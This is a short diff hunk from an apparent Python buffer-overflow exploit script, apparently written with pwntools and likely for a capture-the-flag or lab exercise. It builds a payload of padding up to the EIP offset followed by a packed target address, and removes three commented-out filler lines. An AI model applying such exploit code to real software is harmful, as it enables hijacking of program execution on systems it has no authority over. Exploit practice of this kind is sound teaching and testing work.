@@ -195,9 +195,6 @@ print('  [*] EIP offset is set at {a}'.format(a=eip_offset))
 chain = []
 chain.append('A' * eip_offset)
 chain.append(p32(targetAddr))
-#chain.append('B' * 4)
-#chain.append(p32(0xcafef00d))
-#chain.append(p32(0xf00df00d))
 payload = flat(chain)
 
 # run the exploit
